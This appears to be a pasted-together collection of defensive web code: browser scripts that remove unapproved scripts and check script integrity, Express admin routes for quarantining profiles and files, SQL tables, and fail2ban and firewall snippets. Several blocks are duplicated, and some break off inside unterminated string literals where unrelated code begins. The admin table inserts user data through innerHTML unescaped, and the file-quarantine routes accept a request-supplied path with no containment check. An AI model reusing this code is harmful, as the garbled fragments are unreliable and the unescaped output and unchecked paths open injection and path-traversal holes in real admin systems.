  function report(evt){
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); } catch(e){ console.log('report failed', evt); }
  }

  function isAllowedNode(node){
    if(node.tagName === 'SCRIPT' && node.src) {
      return ALLOWED_SCRIPT_ORIGINS.some(o => node.src.startsWith(o));
    }
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
      return node.href.startsWith(location.origin) || node.href.includes('trusted.cdn.example');
    }
    return true;
  }

  const observer = new MutationObserver(muts => {
    for(const m of muts){
      for(const n of m.addedNodes){
        if(n.nodeType !== 1) continue;
        if((n.tagName === 'SCRIPT' && n.src && !isAllowedNode(n)) ||
           (n.tagName === 'LINK' && n.rel === 'stylesheet' && n.href && !isAllowedNode(n))){
          const info = { event:'removed_injected', tag:n.tagName, src:n.src||n.href||n.outerHTML.slice(0,120), ts:Date.now() };
          try { n.remove(); } catch(e){}
          report(info);
          console.warn('Removed unauthorized node', info);
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList:true, subtree:true });

  function ensureCanonicalStyle(){
    if(!document.getElementById(CANONICAL_STYLE_ID)){
      const s = document.createElement('style');
      s.id = CANONICAL_STYLE_ID;
      s.textContent = ':root{--bg:#0b5cff;--fg:#fff}body{background:var(--bg)!important;color:var(--fg)!important}';
      document.head.appendChild(s);
      report({ event:'reapplied_style', ts:Date.now() });
    }
  }
  setInterval(ensureCanonicalStyle, 3000);
  ensureCanonicalStyle();

  // Safe admin helpers (same-origin only)
  window.__moduleGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => s.src || '[inline]'); },
    removeScriptBySrc(src){
      const s = document.querySelector(`script[src="${src}"]`);
      if(s){ s.remove(); report({ event:'admin_removed_script', src, ts:Date.now() }); return true; }
      return false;
    }
  };

  report({ event:'guard_initialized', ts:Date.now() });
})();

// create a shadow root and attach approved widget markup there
  const host = document.getElementById('widget-host');
  const root = host.attachShadow({ mode: 'closed' }); // closed reduces tampering
  const style = document.createElement('style');
  style.textContent = ':host{display:block} /* widget styles here */';
  root.appendChild(style);
  // append widget content via trusted JS only
  const widget = document.createElement('div');
  widget.textContent = 'Approved widget';
  root.appendChild(widget);

(function(){
      // Toggle between audit (visual highlight) and enforce (deny-by-default)
      const modeEl = document.getElementById('mode');
      const toggle = document.getElementById('toggle-mode');
      const denyStyle = document.getElementById('deny-default');

      // Audit CSS: highlight unknown nodes instead of hiding them
      const auditCss = `
        #app *:not([data-allowed="true"]) {
          outline: 3px dashed rgba(255,0,0,0.85) !important;
          background: rgba(255,0,0,0.06) !important;
          visibility: visible !important;
          display: block !important;
          pointer-events: none !important;
        }
      `;

      let auditStyleEl = null;
      function setMode(m) {
        if (m === 'audit') {
          // enable audit: inject audit CSS and disable deny rules by temporarily disabling the deny style
          denyStyle.disabled = true;
          if (!auditStyleEl) {
            auditStyleEl = document.createElement('style');
            auditStyleEl.id = 'audit-style';
            auditStyleEl.textContent = auditCss;
            document.head.appendChild(auditStyleEl);
          }
          modeEl.textContent = 'audit';
        } else {
          // enforce
          denyStyle.disabled = false;
          if (auditStyleEl) { auditStyleEl.remove(); auditStyleEl = null; }
          modeEl.textContent = 'enforce';
        }
      }

      toggle.addEventListener('click', () => {
        setMode(modeEl.textContent === 'enforce' ? 'audit' : 'enforce');
      });

      // Allow nodes by selector (admin action)
      document.getElementById('allow-btn').addEventListener('click', () => {
        const sel = document.getElementById('allow-selector').value.trim();
        if (!sel) return alert('Enter a selector');
        const nodes = document.querySelectorAll(sel);
        nodes.forEach(n => n.setAttribute('data-allowed', 'true'));
        alert('Marked ' + nodes.length + ' node(s) allowed');
      });

      // Initialize in enforce mode
      setMode('enforce');

      // Accessibility: ensure guard UI is reachable by keyboard
      document.getElementById('guard-ui').setAttribute('role', 'region');
      document.getElementById('guard-ui').setAttribute('aria-label', 'Module guard controls');
    })();const API = '/admin/api'; // adjust to your server
    async function fetchProfiles(q='') {
      const res = await fetch(API + '/profiles?label=other&filter=' + encodeURIComponent(q));
      return res.json();
    }
    function renderList(list) {
      const tbody = document.querySelector('#profiles tbody');
      tbody.innerHTML = '';
      list.forEach(p => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${p.id}</td><td><span class="tag">${p.label}</span></td><td>${p.email||'<span class="muted">no email</span>'}</td><td>${p.status}</td><td>${new Date(p.last_seen).toLocaleString()}</td>
          <td>
            <button class="btn" data-id="${p.id}" data-action="inspect">Inspect</button>
            <button class="btn btn-primary" data-id="${p.id}" data-action="quarantine">Quarantine</button>
            <button class="btn" data-id="${p.id}" data-action="reclassify">Reclassify</button>
            <button class="btn btn-danger" data-id="${p.id}" data-action="delete">Delete</button>
          </td>`;
        tbody.appendChild(tr);
      });
    }
    async function refresh() {
      const q = document.getElementById('filter').value || '';
      const data = await fetchProfiles(q);
      renderList(data);
    }
    document.getElementById('refresh').addEventListener('click', refresh);
    document.getElementById('profiles').addEventListener('click', async (e) => {
      const btn = e.target.closest('button');
      if(!btn) return;
      const id = btn.dataset.id;
      const action = btn.dataset.action;
      if(action === 'inspect') {
        const res = await fetch(API + '/profiles/' + id);
        const p = await res.json();
        const details = document.getElementById('details');
        details.style.display = 'block';
        details.innerHTML = `<h3>Profile ${p.id}</h3><pre>${JSON.stringify(p, null, 2)}</pre>`;
      } else if(action === 'quarantine') {
        if(!confirm('Quarantine profile '+id+'?')) return;
        await fetch(API + '/profiles/' + id + '/quarantine', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({reason:'auto-review'})});
        alert('Quarantine requested');
        refresh();
      } else if(action === 'reclassify') {
        const newLabel = prompt('New label for profile '+id, 'user');
        if(!newLabel) return;
        await fetch(API + '/profiles/' + id + '/reclassify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({label:newLabel, reason:'admin'})});
        refresh();
      } else if(action === 'delete') {
        if(!confirm('Permanently delete profile '+id+'? This is irreversible.')) return;
        await fetch(API + '/profiles/' + id + '/delete', {method:'POST'});
        refresh();
      }
    });
    // initial load
    refresh();
    CREATE TABLE profiles (
  id BIGSERIAL PRIMARY KEY,
  email TEXT,
  label TEXT,
  status TEXT DEFAULT 'active', -- active | quarantined | disabled | deleted
  last_seen TIMESTAMPTZ,
  metadata JSONB
);

CREATE TABLE profile_audit (
  id BIGSERIAL PRIMARY KEY,
  profile_id BIGINT REFERENCES profiles(id),
  action TEXT NOT NULL, -- quarantine, reclassify, delete, restore
  actor TEXT, -- admin id or system
  reason TEXT,
  evidence JSONB,
  created_at TIMESTAMPTZ DEFAULT now()
);
// admin-profiles.js
const express = require('express');
const router = express.Router();
const db = require('./db'); // pg client
const sessionStore = require('./sessionStore'); // implement session revocation

// list profiles by label
router.get('/profiles', async (req, res) => {
  const label = req.query.label || 'other';
  const filter = req.query.filter || '';
  const rows = await db.query('SELECT id,email,label,status,last_seen FROM profiles WHERE label=$1 AND (email ILIKE $2 OR id::text ILIKE $2) ORDER BY last_seen DESC LIMIT 200', [label, `%${filter}%`]);
  res.json(rows.rows);
});

// inspect
router.get('/profiles/:id', async (req, res) => {
  const id = req.params.id;
  const r = await db.query('SELECT * FROM profiles WHERE id=$1', [id]);
  if(!r.rowCount) return res.status(404).send('not found');
  res.json(r.rows[0]);
});

// quarantine
router.post('/profiles/:id/quarantine', async (req, res) => {
  const id = req.params.id;
  const actor = req.user && req.user.id ? req.user.id : 'system';
  const reason = req.body.reason || 'manual';
  await db.query('UPDATE profiles SET status=$1 WHERE id=$2', ['quarantined', id]);
  await db.query('INSERT INTO profile_audit(profile_id, action, actor, reason, evidence) VALUES($1,$2,$3,$4,$5)', [id, 'quarantine', actor, reason, req.body.evidence || null]);
  // revoke sessions and API keys
  await sessionStore.revokeSessionsForProfile(id);
  res.json({ ok:true });
});

// reclassify
router.post('/profiles/:id/reclassify', async (req, res) => {
  const id = req.params.id;
  const newLabel = req.body.label;
  const actor = req.user && req.user.id ? req.user.id : 'system';
  await db.query('UPDATE profiles SET label=$1 WHERE id=$2', [newLabel, id]);
  await db.query('INSERT INTO profile_audit(profile_id, action, actor, reason, evidence) VALUES($1,$2,$3,$4,$5)', [id, 'reclassify', actor, req.body.reason || null, req.body.evidence || null]);
  res.json({ ok:true });
});

// delete permanently (only after quarantine and review)
router.post('/profiles/:id/delete', async (req, res) => {
  const id = req.params.id;
  const actor = req.user && req.user.id ? req.user.id : 'system';
  // move to archive table or delete after storing evidence
  const evidence = await db.query('SELECT * FROM profiles WHERE id=$1', [id]);
  await db.query('INSERT INTO profile_audit(profile_id, action, actor, reason, evidence) VALUES($1,$2,$3,$4,$5)', [id, 'delete', actor, req.body.reason || null, evidence.rows[0]]);
  await db.query('DELETE FROM profiles WHERE id=$1', [id]);
  // revoke sessions
  await sessionStore.revokeSessionsForProfile(id);
  res.json({ ok:true });
});

module.exports = router;
// admin-modules.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // pg client

router.post('/admin/modules/quarantine', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if(!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'quarantine_requested', adminId, reason || null]);
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive:true });
    const dest = path.join(quarantineDir, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // TODO: call CDN purge API here
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;
// correlate-worker.js (concept)
async function correlate() {
  // 1) fetch recent request logs with labels
  // 2) group labels seen together within short windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and flag linked labels for review
}
setInterval(correlate, 60_000);
// admin-modules.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // pg client

router.post('/admin/modules/quarantine', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if(!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'quarantine_requested', adminId, reason || null]);
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive:true });
    const dest = path.join(quarantineDir, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // call CDN purge API here (idempotent) to stop clients loading the file
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;
// correlate-worker.js (concept)
async function correlate() {
  // 1) fetch recent request logs with labels
  // 2) group labels seen together within short windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and flag linked labels for review
  // 5) create temporary bans/quarantines for high-confidence matches (audit record)
}
setInterval(correlate, 60_000);
(function(){

  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint
  const ALLOWED_ORIGINS = [location.origin, 'https://trusted.cdn.example'];

  function report(evt){
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); } catch(e){ console.log('report', evt); }
  }

  function isAllowed(node){
    if(node.tagName === 'SCRIPT' && node.src) return ALLOWED_ORIGINS.some(o => node.src.startsWith(o));
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return node.href.startsWith(location.origin);
    return true;
  }

  const observer = new MutationObserver(muts=>{
    for(const m of muts) for(const n of m.addedNodes){
      if(n.nodeType !== 1) continue;
      if((n.tagName === 'SCRIPT' && n.src && !isAllowed(n)) || (n.tagName === 'LINK' && n.rel === 'stylesheet' && n.href && !isAllowed(n))){
        const info = { event:'removed_injected', tag:n.tagName, src:n.src||n.href||n.outerHTML.slice(0,120), ts:Date.now() };
        try { n.remove(); } catch(e){}
        report(info);
        console.warn('Removed unauthorized node', info);
      }
    }
  });

  observer.observe(document.documentElement, { childList:true, subtree:true });

  // Admin helpers (same-origin only)
  window.__moduleGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => s.src || '[inline]'); },
    allowSelector(sel){ document.querySelectorAll(sel).forEach(n => n.setAttribute('data-allowed','true')); return true; }
  };

  report({ event:'guard_initialized', ts:Date.now() });
})();

(function(){
  const LOG_ENDPOINT = '/_internal/log-tamper';
  const ALLOWED_ORIGINS = [location.origin, 'https://trusted.cdn.example'];

  function report(evt){
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); } catch(e){ console.log('report', evt); }
  }

  function isAllowed(node){
    if(node.tagName === 'SCRIPT' && node.src) return ALLOWED_ORIGINS.some(o => node.src.startsWith(o));
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return node.href.startsWith(location.origin);
    return true;
  }

  const observer = new MutationObserver(muts=>{
    for(const m of muts) for(const n of m.addedNodes){
      if(n.nodeType !== 1) continue;
      if((n.tagName === 'SCRIPT' && n.src && !isAllowed(n)) || (n.tagName === 'LINK' && n.rel === 'stylesheet' && n.href && !isAllowed(n))){
        const info = { event:'removed_injected', tag:n.tagName, src:n.src||n.href||n.outerHTML.slice(0,120), ts:Date.now() };
        try { n.remove(); } catch(e){}
        report(info);
        console.warn('Removed unauthorized node', info);
      }
    }
  });

  observer.observe(document.documentElement, { childList:true, subtree:true });

  window.__moduleGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => s.src || '[inline]'); },
    allowSelector(sel){ document.querySelectorAll(sel).forEach(n => n.setAttribute('data-allowed','true')); return true; }
  };

  report({ event:'guard_initialized', ts:Date.now() });
})();

(function(){
  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint (POST)
  const SUSPICIOUS_PATTERNS = [
    /scent/i,                 // filename or attribute containing "scent"
    /tweaker/i,               // other suspicious keywords
    /^https?:\/\/.*\/scent-/i // external URL pattern
  ];

  function isSuspiciousNode(node) {
    if (!node || node.nodeType !== 1) return false;
    const src = node.src || node.href || '';
    const attrs = Array.from(node.attributes || []).map(a => `${a.name}=${a.value}`).join(' ');
    const text = (node.className || '') + ' ' + attrs + ' ' + src;
    return SUSPICIOUS_PATTERNS.some(p => p.test(text));
  }

  function report(evt) {
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); }
    catch(e){ console.log('report failed', evt); }
  }

  function quarantineNode(node) {
    try {
      // preserve a copy for evidence
      const evidence = { outerHTML: node.outerHTML.slice(0, 2000), ts: Date.now(), tag: node.tagName };
      report({ event: 'quarantine', evidence });
      // move node into a sandbox iframe for safe observation
      const sandbox = document.getElementById('__scent_sandbox') || createSandbox();
      const holder = document.createElement('div');
      holder.style.display = 'none';
      holder.innerHTML = node.outerHTML;
      sandbox.contentDocument.body.appendChild(holder);
      // remove original node from main document
      node.remove();
    } catch (err) {
      console.warn('quarantine failed', err);
      try { node.remove(); } catch(e){}
    }
  }

  function createSandbox() {
    const iframe = document.createElement('iframe');
    iframe.id = '__scent_sandbox';
    iframe.sandbox = 'allow-scripts'; // allow-scripts only if you intend to observe; otherwise use 'allow-same-origin' carefully
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    // minimal safe content
    iframe.srcdoc = '<!doctype html><html><body><script>window.addEventListener("error",e=>parent.postMessage({type:"sandbox-error",msg:e.message}, "*"))
    // server/quarantine.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // implement DB client for audit

// receive client tamper reports
router.post('/_internal/log-tamper', express.json({limit:'1mb'}), async (req, res) => {
  const payload = req.body;
  await db.query('INSERT INTO tamper_logs(payload, created_at) VALUES($1, now())', [payload]);
  res.status(204).end();
});

// admin: move module file to quarantine
router.post('/admin/quarantine-file', async (req, res) => {
  const { filePath, adminId, reason } = req.body;
  if (!adminId || !filePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', filePath);
  try {
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive: true });
    const dest = path.join(quarantineDir, path.basename(filePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(file_path, action, actor, reason, created_at) VALUES($1,$2,$3,$4,now())', [filePath, 'quarantine', adminId, reason || null]);
    // optionally purge CDN cache here (idempotent)
    res.json({ ok: true, quarantined: dest });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'failed' });
  }
});

module.exports = router;
(function(){
  // server/quarantine.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // implement DB client

router.post('/_internal/log-tamper', express.json({limit:'1mb'}), async (req, res) => {
  const payload = req.body;
  await db.query('INSERT INTO tamper_logs(payload, created_at) VALUES($1, now())', [payload]);
  res.status(204).end();
});

router.post('/admin/quarantine-file', async (req, res) => {
  const { filePath, adminId, reason } = req.body;
  if(!adminId || !filePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', filePath);
  try {
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive: true });
    const dest = path.join(quarantineDir, path.basename(filePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(file_path, action, actor, reason, created_at) VALUES($1,$2,$3,$4,now())', [filePath, 'quarantine', adminId, reason || null]);
    // call CDN purge API here (idempotent)
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;

  const LOG_ENDPOINT = '/_internal/log-tamper'; // POST JSON
  const ALLOWED_ORIGINS = [location.origin, 'https://trusted.cdn.example'];
  const SUSPICIOUS_PATTERNS = [/scent/i, /tweaker/i, /suspicious-widget/i];

  function sendReport(obj){

    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(obj)); }
    catch(e){ console.log('report failed', obj); }
  }

  function nodeText(node){
    const src = node.src || node.href || '';
    const cls = node.className || '';
    const attrs = Array.from(node.attributes || []).map(a => `${a.name}=${a.value}`).join(' ');
    return `${node.tagName} ${cls} ${attrs} ${src}`.slice(0,200);
  }

  function isAllowed(node){
    if(node.tagName === 'SCRIPT' && node.src) return ALLOWED_ORIGINS.some(o => node.src.startsWith(o));
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return ALLOWED_ORIGINS.some(o => node.href.startsWith(o));
    return node.hasAttribute && node.hasAttribute('data-allowed');
  }

  function isSuspicious(node){
    if(!node || node.nodeType !== 1) return false;
    const txt = nodeText(node);
    if(SUSPICIOUS_PATTERNS.some(p => p.test(txt))) return true;
    // heuristic: external script from ephemeral domain
    if(node.tagName === 'SCRIPT' && node.src && /\/cdn\/temp|\.xyz$|\.top$/.test(node.src)) return true;
    return false;
  }

  function quarantine(node){
    try {
      const evidence = { outerHTML: node.outerHTML.slice(0,2000), ts: Date.now(), tag: node.tagName };
      sendReport({ event: 'quarantine', evidence });
      // preserve copy in hidden sandbox for analysis
      const sandbox = getOrCreateSandbox();
      const holder = sandbox.contentDocument.createElement('div');
      holder.setAttribute('data-quarantine-ts', Date.now());
      holder.innerHTML = node.outerHTML;
      sandbox.contentDocument.body.appendChild(holder);
      node.remove();
    } catch(err){
      try { node.remove(); } catch(e){}
      sendReport({ event: 'quarantine_error', msg: String(err), ts: Date.now() });
    }
  }

  function getOrCreateSandbox(){
    let iframe = document.getElementById('__module_sandbox');
    if(iframe) return iframe;
    iframe = document.createElement('iframe');
    iframe.id = '__module_sandbox';
    iframe.sandbox = 'allow-scripts'; // keep minimal privileges
    iframe.style.display = 'none';
    iframe.srcdoc = '<!doctype html><html><body><script>window.addEventListener("error",e=>parent.postMessage({type:"sandbox-error",msg:e.message}, "*"))(async function(){
  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint
  const ALLOWLIST = new Set([location.origin]); // add trusted origins
  const MAX_BYTES = 5_000_000; // safety cap for hashing

  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  async function fetchAndHash(url) {
    const resp = await fetch(url, { credentials: 'same-origin' });
    if (!resp.ok) throw new Error('fetch failed ' + resp.status);
    const reader = resp.body.getReader();
    const chunks = [];
    let total = 0;
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      total += value.length;
      if (total > MAX_BYTES) throw new Error('resource too large');
      chunks.push(value);
    }
    const buf = new Uint8Array(total);
    let offset = 0;
    for (const c of chunks) { buf.set(c, offset); offset += c.length; }
    return { buffer: buf.buffer, text: new TextDecoder().decode(buf) };
  }

  function report(obj) {
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(obj)); } catch(e){ console.warn('report failed', e); }
  }

  async function verifyScriptTag(script) {
    try {
      const src = script.src;
      const integrity = script.getAttribute('integrity') || '';
      // If script is inline and has no integrity, skip (or treat as suspicious per policy)
      if (!src) return;
      // Only verify external scripts from non-allowlist origins if policy requires
      const origin = new URL(src, location.href).origin;
      if (!ALLOWLIST.has(origin) && !integrity) {
        report({ event: 'missing_integrity', src, ts: Date.now() });
        script.remove();
        return;
      }
      if (integrity) {
        // expected format: "sha256-BASE64"
        const expected = integrity.trim().split(/\s+/).find(s => s.startsWith('sha256-'));
        if (!expected) {
          report({ event: 'unsupported_integrity', src, integrity, ts: Date.now() });
          script.remove();
          return;
        }
        const { buffer } = await fetchAndHash(src);
        const base64 = await sha256Base64(buffer);
        const computed = 'sha256-' + base64;
        if (computed !== expected) {
          report({ event: 'integrity_mismatch', src, expected, computed, ts: Date.now(), sample: (new TextDecoder()).decode(buffer).slice(0,200) });
          // quarantine: remove and preserve evidence in hidden iframe
          quarantineScript(script, buffer);
        } else {
          // optionally cache verified blob URL to avoid re-fetch
        }
      }
    } catch (err) {
      report({ event: 'verify_error', src: script.src || '[inline]', msg: String(err), ts: Date.now() });
      try { script.remove(); } catch(e){}
    }
  }

  function quarantineScript(script, buffer) {
    try {
      const iframe = getOrCreateSandbox();
      const holder = iframe.contentDocument.createElement('pre');
      holder.textContent = `Quarantined ${script.src}\n\n` + (new TextDecoder()).decode(buffer).slice(0,2000);
      holder.style.whiteSpace = 'pre-wrap';
      iframe.contentDocument.body.appendChild(holder);
      script.remove();
      report({ event: 'quarantined', src: script.src, ts: Date.now() });
    } catch (e) {
      try { script.remove(); } catch(e){}
      report({ event: 'quarantine_failed', src: script.src, msg: String(e), ts: Date.now() });
    }
  }

  function getOrCreateSandbox() {
    let iframe = document.getElementById('__integrity_sandbox');
    if (iframe) return iframe;
    iframe = document.createElement('iframe');
    iframe.id = '__integrity_sandbox';
    iframe.sandbox = 'allow-scripts'; // keep minimal privileges
    iframe.style.display = 'none';
    iframe.srcdoc = '<!doctype html><html><body></body></html>';
    document.documentElement.appendChild(iframe);
    return iframe;
  }

  // Initial verification pass
  document.querySelectorAll('script[src]').forEach(s => verifyScriptTag(s));

  // Monitor for new scripts added dynamically
  const mo = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if (n.tagName === 'SCRIPT') verifyScriptTag(n);
      }
    }
  });
  mo.observe(document.documentElement, { childList: true, subtree: true });

  // Detect attempts to override crypto.subtle (tampering attempt)
  const originalSubtle = crypto.subtle;
  Object.defineProperty(crypto, 'subtle', {
    configurable: false,
    enumerable: true,
    get() { return originalSubtle; }
  });
  // If someone tries to redefine, it will throw; report if changed
  setInterval(() => {
    if (crypto.subtle !== originalSubtle) {
      report({ event: 'crypto_subtle_tampered', ts: Date.now() });
      // reload or take defensive action
      try { location.reload(); } catch(e){}
    }
  }, 2000);

  // Expose safe admin helpers (same-origin only)
  window.__integrityGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => ({src:s.src, integrity:s.getAttribute('integrity')})); },
    allowScriptBySrc(src){ const s = document.querySelector(`script[src="${src}"]`); if(s) s.setAttribute('data-allowed','true'); return !!s; }
  };
})();
// integrity-middleware.js
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

function computeSRI(filePath) {
  const buf = fs.readFileSync(filePath);
  const hash = crypto.createHash('sha256').update(buf).digest('base64');
  return 'sha256-' + hash;
}

module.exports = function integrityMiddleware(options) {
  const assetsDir = options.assetsDir || path.join(__dirname, 'public');
  // precompute SRI map at startup
  const sriMap = {};
  for (const f of fs.readdirSync(path.join(assetsDir, 'modules') || [])) {
    const full = path.join(assetsDir, 'modules', f);
    if (fs.statSync(full).isFile()) sriMap['/modules/' + f] = computeSRI(full);
  }

  return function (req, res, next) {
    // set CSP header to require SRI for scripts (report-only during rollout)
    res.setHeader('Content-Security-Policy', "script-src 'self' 'sha256-PLACEHOLDER'"); // replace with proper policy
    // attach SRI header for known assets (optional custom header)
    if (sriMap[req.path]) res.setHeader('X-Content-SRI', sriMap[req.path]);
    next();
  };
};
// on file upload, compute hash and compare to expected (if replacing existing asset)
const crypto = require('crypto');
function sha256Base64(buffer) {
  return crypto.createHash('sha256').update(buffer).digest('base64');
}
function validateUpload(buffer, expectedSRI) {
  const computed = 'sha256-' + sha256Base64(buffer);
  return computed === expectedSRI;
}
# /etc/fail2ban/jail.d/ssh-local.conf
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 5
bantime = 3600
# add-drop-ip.sh
IP="$1"
nft add rule inet filter input ip saddr "$IP" drop 2>/dev/null || echo "rule exists or nft not available"
PID=1234
mkdir -p /var/quarantine/pids/$PID
ps -fp $PID > /var/quarantine/pids/$PID/ps.txt
lsof -p $PID > /var/quarantine/pids/$PID/lsof.txt 2>/dev/null || true
cp /proc/$PID/cmdline /var/quarantine/pids/$PID/cmdline 2>/dev/null || true
/* CONFIGURE: set API_BASE and secure auth headers on server side */
const API_BASE = '/admin/api'; // server endpoints must authenticate and audit
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' }; // replace with secure auth

/* Detection heuristics: tune to your environment */
const SUSPICIOUS_SELECTORS = [
  '.terminal', '.xterm', 'x-terminal', '[data-terminal]', '[data-protector]', 'iframe.terminal-frame'
];
const SUSPICIOUS_KEYWORDS = [/scent/i, /protector/i, /tweaker/i, /mask/i, /obfuscate/i];

/* Mode: audit (log only) or enforce (hide + quarantine) */
let mode = 'audit'; // 'audit' or 'enforce'

function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Compact evidence builder */
function evidenceFor(node){
  try {
    return {
      tag: node.tagName,
      id: node.id || null,
      classes: node.className || null,
      outerHTML: node.outerHTML ? node.outerHTML.slice(0,2000) : null,
      detectedAt: Date.now()
    };
  } catch(e){ return { tag: node.tagName, detectedAt: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function reportToServer(payload){
  try {
    navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload));
  } catch(e){
    // fallback to fetch
    fetch(API_BASE + '/tamper-log', { method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload) }).catch(()=>{});
  }
}

/* Create hidden sandbox iframe for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__terminal_sandbox');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__terminal_sandbox';
  iframe.sandbox = 'allow-scripts'; // minimal privileges; do not allow same-origin unless you intend to analyze
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Quarantine: move a copy into sandbox and remove original */
function quarantineNode(node, reason){
  try {
    const ev = evidenceFor(node);
    ev.reason = reason;
    reportToServer({ event: 'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    holder.innerHTML = node.outerHTML || '<!-- no outerHTML -->';
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    log('Quarantined node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
    addEventRow(ev);
  } catch (err) {
    try { node.remove(); } catch(e){}
    log('Quarantine failed: ' + String(err));
  }
}

/* Neutralize in-page terminal: hide and disable pointer events */
function neutralizeNode(node, reason){
  try {
    node.style.display = 'none';
    node.style.pointerEvents = 'none';
    node.setAttribute('data-neutralized', 'true');
    node.setAttribute('data-neutralize-reason', reason);
    reportToServer({ event: 'neutralize', evidence: evidenceFor(node) });
    log('Neutralized node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
    addEventRow({ time: Date.now(), selector: node.tagName, reason });
  } catch(e){
    log('Neutralize error: ' + String(e));
  }
}

/* Heuristic: detect nodes by selectors and by keyword matches in attributes/classes/src */
function isSuspicious(node){
  try {
    if (!node || node.nodeType !== 1) return false;
    // selector match
    for (const sel of SUSPICIOUS_SELECTORS) {
      if (node.matches && node.matches(sel)) return true;
    }
    // attribute/class/src text scan
    const text = (node.className || '') + ' ' + (node.id || '') + ' ' + (node.getAttribute && (node.getAttribute('data-protector') || '')) + ' ' + (node.src || node.href || '');
